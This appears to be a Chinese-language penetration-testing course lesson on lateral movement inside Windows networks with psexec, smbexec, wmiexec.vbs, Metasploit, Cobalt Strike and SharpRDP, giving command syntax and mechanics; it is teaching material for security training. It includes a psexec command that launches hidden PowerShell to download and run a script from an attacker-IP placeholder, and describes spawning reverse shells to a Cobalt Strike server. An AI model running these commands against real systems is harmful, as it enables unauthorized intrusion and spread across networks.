# 课程P79：第49天 - 内网横向移动：外部工具篇 🔧

在本节课中，我们将学习内网横向移动的外部工具使用方法。上一节我们介绍了Windows系统内置的横向移动工具，本节我们将重点讲解需要上传到目标主机的外部工具，它们能扩展命令功能并实现更强大的横向渗透能力。

## 概述 📋

本节课内容分为五个部分：`psexec`与`smbexec`工具、`wmiexec`脚本、在Metasploit和Cobalt Strike中的横向移动操作，以及`SharpRDP`工具。这些工具能帮助我们基于已控制的跳板机，进一步渗透内网中的其他主机。

---

## 第一部分：psexec与smbexec工具

上一节我们介绍了利用系统内置命令进行横向移动。本节中，我们来看看两个功能强大的外部工具：`psexec`和`smbexec`。

### psexec工具介绍

`psexec`是一个轻量级的Telnet替代品。它允许在远程系统上执行进程，并为控制台应用程序提供完整的交互性，而无需在目标主机上安装客户端软件。

其工作原理基于以下步骤：
1.  建立IPC连接。
2.  将服务程序释放到目标机器。
3.  使用`OpenSCManager`打开服务控制器句柄。
4.  创建并启动服务，从而执行命令。

**基本使用语法如下：**
*   若已建立IPC连接，可直接使用：`psexec \\目标IP 命令`
*   若未建立连接，需指定凭据：`psexec \\目标IP -u 用户名 -p 密码 命令`

以下是`psexec`的两种主要用途：

**1. 反弹CMD shell**
通过以下命令，可以获取一个交互式的CMD会话。
```cmd
psexec \\目标IP -s cmd.exe /accepteula
```
参数说明：`-s`表示以`SYSTEM`权限运行，`/accepteula`用于自动接受许可协议。

![](img/0b422fb9f26aa4358ebbcda4a0236550_1.png)

**2. 执行单条命令**
直接在命令后附加要执行的指令即可。
```cmd
psexec \\目标IP -u administrator -p Password123 ipconfig
```

![](img/0b422fb9f26aa4358ebbcda4a0236550_2.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_3.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_4.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_5.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_6.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_7.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_8.png)

**在Cobalt Strike中的注意事项**
在Cobalt Strike的Beacon中执行`psexec`时，由于通信基于HTTP，无法直接获得交互式shell。我们的主要目的是在远程主机上执行反弹shell的命令。**注意：** 在Beacon中使用`psexec`传递命令时，**不要**用双引号包裹命令，否则会报“找不到文件”错误。
正确用法示例（用于执行PowerShell反弹）：
```cmd
psexec \\192.168.1.100 -u domain\user -p pass -s cmd.exe /c powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://攻击机IP:80/a'))"
```

![](img/0b422fb9f26aa4358ebbcda4a0236550_9.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_11.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_13.png)

### smbexec工具介绍

![](img/0b422fb9f26aa4358ebbcda4a0236550_15.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_17.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_19.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_20.png)

`smbexec`是基于`psexec`原理的测试工具，属于`impacket`工具套件的一部分。它的使用格式和效果与`psexec`类似。

![](img/0b422fb9f26aa4358ebbcda4a0236550_22.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_24.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_25.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_27.png)

**使用示例：**
```cmd
smbexec.py 域名/用户名:密码@目标IP
```
执行后，同样会建立连接、上传服务、执行命令并清理痕迹。

![](img/0b422fb9f26aa4358ebbcda4a0236550_29.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_31.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_33.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_34.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_36.png)

**关于Impacket套件**
Impacket项目提供了多种内网渗透脚本，包括`psexec.py`和`smbexec.py`等。这些工具既有Python脚本版本（需目标机有Python环境），也有编译好的Windows可执行文件（`.exe`），可根据实际情况选择使用。

![](img/0b422fb9f26aa4358ebbcda4a0236550_37.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_39.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_40.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_42.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_44.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_46.png)

---

![](img/0b422fb9f26aa4358ebbcda4a0236550_48.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_50.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_51.png)

## 第二部分：wmiexec脚本

上一节我们提到`wmic`命令执行无回显的缺点。本节中，我们利用`wmiexec.vbs`脚本来解决这个问题，实现带回显的WMI横向移动。

### 脚本用法

这是一个VBS脚本，需要使用`cscript`解释器执行。`/nologo`参数用于禁止显示脚本标头信息。

**1. 执行单条命令**
```cmd
cscript.exe //nologo wmiexec.vbs /cmd 用户名 密码 目标IP "要执行的命令"
```

**2. 获取半交互式Shell**
不指定具体命令，可直接获得一个半交互式的CMD shell。
```cmd
cscript.exe //nologo wmiexec.vbs /shell 用户名 密码 目标IP
```

### 原理与注意事项

该脚本的核心是向目标上传并执行一个名为`wmi.dll`的文件，该文件负责捕获命令执行结果并回传。

**可能遇到的问题：**
如果多次对同一目标使用该脚本，可能会因`wmi.dll`文件被占用而导致上传失败。解决方法是在VBS脚本中修改`wmi.dll`的文件名，避免冲突。

---

![](img/0b422fb9f26aa4358ebbcda4a0236550_53.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_55.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_57.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_58.png)

## 第三部分：Metasploit与Cobalt Strike中的横向移动

![](img/0b422fb9f26aa4358ebbcda4a0236550_60.png)

在渗透测试框架中，可以更方便地集成上述工具进行横向移动。

### 在Metasploit中操作

![](img/0b422fb9f26aa4358ebbcda4a0236550_62.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_64.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_66.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_67.png)

1.  获取一个跳板机的Meterpreter会话。
2.  通过`upload`命令将`psexec.exe`等工具上传到跳板机。
3.  进入跳板机的shell环境（`shell`命令）。
4.  在跳板机的shell中执行横向移动命令，攻击内网其他主机。

![](img/0b422fb9f26aa4358ebbcda4a0236550_69.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_71.png)

### 在Cobalt Strike中操作

![](img/0b422fb9f26aa4358ebbcda4a0236550_73.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_75.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_77.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_79.png)

1.  通过Beacon控制一台跳板机。
2.  使用`upload`功能将外部工具上传。
3.  在Beacon中使用`execute`或`shell`命令运行上传的工具。
4.  重点是利用工具在远程主机上执行**反弹shell的命令**，使新主机回连到你的Cobalt Strike团队服务器，从而扩展控制范围。

![](img/0b422fb9f26aa4358ebbcda4a0236550_81.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_83.png)

---

## 第四部分：SharpRDP工具简介

除了上述基于SMB和WMI协议的工具，还可以利用RDP（远程桌面协议）进行横向移动。`SharpRDP`是一款.NET工具，允许在远程主机上执行命令。

![](img/0b422fb9f26aa4358ebbcda4a0236550_85.png)

其基本原理是通过RDP协议连接到目标，并利用漏洞或特性在目标系统上启动进程。由于RDP是Windows常见的管理协议，此类操作可能更不易被察觉。具体使用方法需参考该工具的专门文档。

![](img/0b422fb9f26aa4358ebbcda4a0236550_87.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_89.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_91.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_93.png)

---

![](img/0b422fb9f26aa4358ebbcda4a0236550_95.png)

## 总结 🎯

本节课我们一起学习了内网横向移动的外部工具。
*   我们掌握了`psexec`和`smbexec`工具的原理与用法，它们通过创建服务来实现远程命令执行。
*   我们了解了`wmiexec.vbs`脚本如何弥补`wmic`无回显的缺陷。
*   我们探讨了如何在Metasploit和Cobalt Strike两大渗透框架中，结合这些工具进行高效的横向移动。
*   最后，我们简要介绍了利用RDP协议的`SharpRDP`工具。

![](img/0b422fb9f26aa4358ebbcda4a0236550_97.png)

![](img/0b422fb9f26aa4358ebbcda4a0236550_98.png)

掌握这些外部工具，能显著提升你在内网渗透中的横向扩展能力。请务必在授权环境下进行练习，并理解每种工具背后的原理。